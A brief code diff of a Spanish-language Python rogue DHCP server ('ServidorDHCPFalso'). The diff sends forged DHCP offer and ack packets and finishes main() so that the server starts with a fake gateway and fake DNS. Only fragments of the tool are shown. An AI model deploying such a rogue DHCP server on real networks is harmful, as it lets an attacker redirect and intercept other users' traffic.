@@ -95,6 +95,7 @@ class ServidorDHCPFalso:
                       chaddr=mac_bytes + b'\x00' * 10) /
                 DHCP(options=self._opciones_dhcp("offer"))
             )
+
             sendp(respuesta, iface=self.interfaz, verbose=False)
 
         except Exception as e:
@@ -124,6 +125,7 @@ class ServidorDHCPFalso:
                       chaddr=mac_bytes + b'\x00' * 10) /
                 DHCP(options=self._opciones_dhcp("ack"))
             )
+
             sendp(respuesta, iface=self.interfaz, verbose=False)
 
         except Exception as e:
@@ -243,3 +245,15 @@ def main():
     servidor = ServidorDHCPFalso(
         interfaz=interfaz,
         ip_servidor=ip_servidor,
+        gateway_falso=gateway_falso,
+        dns_falso=dns_falso,
+        mascara=mascara,
+        ip_inicio=ip_inicio,
+        total_ips=total_ips
+    )
+
+    servidor.iniciar()
+
+
+if __name__ == "__main__":
+    main()
